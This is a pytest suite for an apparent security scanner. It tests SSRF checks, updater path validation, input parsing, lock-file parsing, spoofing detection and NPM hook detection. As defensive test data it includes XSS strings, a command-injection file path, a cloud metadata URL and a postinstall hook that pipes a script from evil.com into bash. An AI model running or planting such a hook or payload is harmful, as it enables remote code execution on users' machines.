import ipaddress
import json
import tempfile
import os
import sys
from pathlib import Path
from unittest.mock import patch, MagicMock
from typing import Any, Dict, List

import pytest

from threatdeflect.utils.utils import (
    parse_targets,
    parse_repo_urls,
    _validate_updater_paths,
    defang_ioc,
    detect_visual_spoofing,
)


class TestSSRFEndpointValidation:

    def _make_client(self, endpoint: str) -> Any:
        with patch("threatdeflect.api.api_client.keyring") as mock_kr:
            mock_kr.get_password.return_value = None
            from threatdeflect.api.api_client import ApiClient
            client = ApiClient()
            client.ai_endpoint = endpoint
            return client

    def test_rejects_private_ip_10(self) -> None:
        client = self._make_client("http://10.0.0.1:11434/api/generate")
        assert client._is_safe_ai_endpoint() is False

    def test_rejects_private_ip_172(self) -> None:
        client = self._make_client("http://172.16.0.1:11434/api/generate")
        assert client._is_safe_ai_endpoint() is False

    def test_rejects_private_ip_192(self) -> None:
        client = self._make_client("http://192.168.1.1:11434/api/generate")
        assert client._is_safe_ai_endpoint() is False

    def test_rejects_link_local(self) -> None:
        client = self._make_client("http://169.254.169.254/latest/meta-data/")
        assert client._is_safe_ai_endpoint() is False

    def test_rejects_ftp_scheme(self) -> None:
        client = self._make_client("ftp://localhost:11434/api/generate")
        assert client._is_safe_ai_endpoint() is False

    def test_rejects_no_host(self) -> None:
        client = self._make_client("http:///api/generate")
        assert client._is_safe_ai_endpoint() is False

    def test_rejects_empty(self) -> None:
        client = self._make_client("")
        assert client._is_safe_ai_endpoint() is False

    def test_rejects_none(self) -> None:
        client = self._make_client(None)
        assert client._is_safe_ai_endpoint() is False

    def test_accepts_localhost(self) -> None:
        client = self._make_client("http://localhost:11434/api/generate")
        assert client._is_safe_ai_endpoint() is True

    def test_accepts_127(self) -> None:
        client = self._make_client("http://127.0.0.1:11434/api/generate")
        assert client._is_safe_ai_endpoint() is True

    def test_rejects_dns_rebind(self) -> None:
        with patch("threatdeflect.api.api_client.socket.getaddrinfo") as mock_dns:
            mock_dns.return_value = [(2, 1, 6, '', ('10.0.0.1', 11434))]
            client = self._make_client("http://localhost:11434/api/generate")
            assert client._is_safe_ai_endpoint() is False


class TestUpdaterPathValidation:

    def test_rejects_negative_pid(self) -> None:
        with pytest.raises(ValueError, match="PID invalido"):
            _validate_updater_paths("/tmp/asset", "/usr/bin/app", -1)

    def test_rejects_zero_pid(self) -> None:
        with pytest.raises(ValueError, match="PID invalido"):
            _validate_updater_paths("/tmp/asset", "/usr/bin/app", 0)

    def test_rejects_symlink_new_asset(self) -> None:
        with tempfile.NamedTemporaryFile(delete=False) as real:
            real.write(b"test")
            real_path = real.name

        link_path = real_path + ".link"
        try:
            os.symlink(real_path, link_path)
            with pytest.raises(ValueError, match="Symlinks"):
                _validate_updater_paths(link_path, "/opt/app/threatdeflect", 1234)
        finally:
            os.unlink(link_path)
            os.unlink(real_path)

    def test_rejects_asset_outside_tempdir(self) -> None:
        with pytest.raises((ValueError, OSError)):
            _validate_updater_paths("/etc/passwd", "/opt/app/td", 1234)

    @pytest.mark.skipif(sys.platform == "win32", reason="Unix-only test")
    def test_rejects_executable_in_protected_dir(self) -> None:
        with tempfile.NamedTemporaryFile(delete=False, dir=tempfile.gettempdir()) as f:
            f.write(b"fake")
            temp_asset = f.name
        try:
            with pytest.raises(ValueError, match="diretorio protegido"):
                _validate_updater_paths(temp_asset, "/etc/threatdeflect", 1234)
        finally:
            os.unlink(temp_asset)

    @pytest.mark.skipif(sys.platform != "win32", reason="Windows-only test")
    def test_rejects_cmd_metacharacters_windows(self) -> None:
        with tempfile.NamedTemporaryFile(delete=False, dir=tempfile.gettempdir(), suffix=".exe") as f:
            f.write(b"fake")
            temp_asset = f.name
        try:
            with pytest.raises(ValueError, match="metacaracteres"):
                _validate_updater_paths(temp_asset, "C:\\Program Files\\app&malicious.exe", 1234)
        finally:
            os.unlink(temp_asset)


class TestInputValidation:

    def test_parse_targets_ignores_private_ips(self) -> None:
        ips, urls = parse_targets("192.168.1.1\n10.0.0.1\n8.8.8.8")
        assert "8.8.8.8" in ips

    def test_parse_targets_rejects_garbage(self) -> None:
        ips, urls = parse_targets("not_a_target\n!!!invalid!!!\n<script>alert(1)</script>")
        assert len(ips) == 0
        assert len(urls) == 0

    def test_parse_targets_handles_empty(self) -> None:
        ips, urls = parse_targets("")
        assert ips == []
        assert urls == []

    def test_parse_targets_strips_comments(self) -> None:
        ips, urls = parse_targets("8.8.8.8 # dns google\nhttps://example.com # test")
        assert "8.8.8.8" in ips

    def test_parse_repo_urls_rejects_non_git_hosts(self) -> None:
        valid, invalid, dupes = parse_repo_urls("https://evil.com/malware/repo")
        assert len(valid) == 0
        assert len(invalid) == 1

    def test_parse_repo_urls_normalizes(self) -> None:
        valid, _, _ = parse_repo_urls("https://github.com/user/repo.git\nhttps://github.com/user/repo")
        assert len(valid) == 1

    def test_parse_repo_urls_xss_payload(self) -> None:
        valid, invalid, _ = parse_repo_urls('<img src=x onerror="alert(1)">')
        assert len(valid) == 0


class TestSecretMasking:

    def test_mask_never_leaks_content(self) -> None:
        from threatdeflect.core.repository_analyzer import RepositoryAnalyzer
        secret = "AKIAIOSFODNN7EXAMPLE_SUPER_SECRET_KEY_12345"
        result = f"[REDACTED:{len(secret)}]"
        assert secret not in result
        assert "REDACTED" in result
        assert str(len(secret)) in result


class TestLockFileParsing:

    @pytest.fixture
    def analyzer(self) -> Any:
        with patch("threatdeflect.api.api_client.keyring") as mock_kr:
            mock_kr.get_password.return_value = None
            from threatdeflect.api.api_client import ApiClient
            from threatdeflect.core.repository_analyzer import RepositoryAnalyzer
            client = ApiClient()
            ra = RepositoryAnalyzer("https://github.com/test/repo", client)
            return ra

    def test_package_lock_json_parsing(self, analyzer: Any) -> None:
        content = json.dumps({
            "dependencies": {
                "lodash": {"version": "4.17.21"},
                "express": {"version": "4.18.0"}
            }
        })
        file_info = {"path": "package-lock.json", "name": "package-lock.json"}
        findings, iocs, deps = analyzer._process_file_content(content, file_info)
        assert "package-lock.json" in deps
        dep_names = [d['name'] for d in deps["package-lock.json"]]
        assert "lodash" in dep_names
        assert "express" in dep_names

    def test_cargo_lock_parsing(self, analyzer: Any) -> None:
        content = """[[package]]
name = "serde"
version = "1.0.0"

[[package]]
name = "tokio"
version = "1.0.0"
"""
        file_info = {"path": "Cargo.lock", "name": "Cargo.lock"}
        findings, iocs, deps = analyzer._process_file_content(content, file_info)
        assert "Cargo.lock" in deps
        dep_names = [d['name'] for d in deps["Cargo.lock"]]
        assert "serde" in dep_names
        assert "tokio" in dep_names

    def test_pipfile_lock_parsing(self, analyzer: Any) -> None:
        content = json.dumps({
            "default": {"requests": {}, "flask": {}},
            "develop": {"pytest": {}}
        })
        file_info = {"path": "Pipfile.lock", "name": "Pipfile.lock"}
        findings, iocs, deps = analyzer._process_file_content(content, file_info)
        assert "Pipfile.lock" in deps
        dep_names = [d['name'] for d in deps["Pipfile.lock"]]
        assert "requests" in dep_names
        assert "pytest" in dep_names

    def test_malformed_json_lock_file(self, analyzer: Any) -> None:
        content = "{{{{not valid json at all!!!!"
        file_info = {"path": "package-lock.json", "name": "package-lock.json"}
        findings, iocs, deps = analyzer._process_file_content(content, file_info)
        assert len(deps) == 0

    def test_composer_lock_parsing(self, analyzer: Any) -> None:
        content = json.dumps({
            "packages": [{"name": "laravel/framework"}],
            "packages-dev": [{"name": "phpunit/phpunit"}]
        })
        file_info = {"path": "composer.lock", "name": "composer.lock"}
        findings, iocs, deps = analyzer._process_file_content(content, file_info)
        assert "composer.lock" in deps
        dep_names = [d['name'] for d in deps["composer.lock"]]
        assert "laravel/framework" in dep_names
        assert "phpunit/phpunit" in dep_names


class TestNPMDangerousHooks:

    @pytest.fixture
    def analyzer(self) -> Any:
        with patch("threatdeflect.api.api_client.keyring") as mock_kr:
            mock_kr.get_password.return_value = None
            from threatdeflect.api.api_client import ApiClient
            from threatdeflect.core.repository_analyzer import RepositoryAnalyzer
            client = ApiClient()
            return RepositoryAnalyzer("https://github.com/test/repo", client)

    def test_detects_preinstall_hook(self, analyzer: Any) -> None:
        content = json.dumps({
            "name": "malicious-pkg",
            "scripts": {"preinstall": "node exploit.js"}
        })
        file_info = {"path": "package.json", "name": "package.json"}
        findings, _, _ = analyzer._process_file_content(content, file_info)
        hook_findings = [f for f in findings if f["type"] == "NPM Dangerous Hook"]
        assert len(hook_findings) >= 1

    def test_detects_curl_pipe_bash(self, analyzer: Any) -> None:
        content = json.dumps({
            "name": "supply-chain-attack",
            "scripts": {"postinstall": "curl https://evil.com/payload.sh | bash"}
        })
        file_info = {"path": "package.json", "name": "package.json"}
        findings, _, _ = analyzer._process_file_content(content, file_info)
        rce_findings = [f for f in findings if f["type"] == "Remote Code Loading"]
        assert len(rce_findings) >= 1

    def test_safe_scripts_no_findings(self, analyzer: Any) -> None:
        content = json.dumps({
            "name": "safe-pkg",
            "scripts": {"start": "node index.js", "test": "jest"}
        })
        file_info = {"path": "package.json", "name": "package.json"}
        findings, _, _ = analyzer._process_file_content(content, file_info)
        hook_findings = [f for f in findings if "Hook" in f.get("type", "") or "Remote" in f.get("type", "")]
        assert len(hook_findings) == 0


class TestVisualSpoofing:

    def test_rtlo_detected(self) -> None:
        assert detect_visual_spoofing("file_gpj\u202eexe") == "RTLO"

    def test_punycode_detected(self) -> None:
        assert detect_visual_spoofing("xn--80ak6aa92e.com") == "Punycode/Cyrillic"

    def test_cyrillic_detected(self) -> None:
        assert detect_visual_spoofing("\u043f\u0440\u0438\u043c\u0435\u0440.com") == "Punycode/Cyrillic"

    def test_clean_input(self) -> None:
        assert detect_visual_spoofing("google.com") is None

    def test_defang_ioc_neutralizes(self) -> None:
        result = defang_ioc("https://malware.com/payload")
        assert "https://" not in result
        assert "hxxps" in result
        assert "[.]" in result
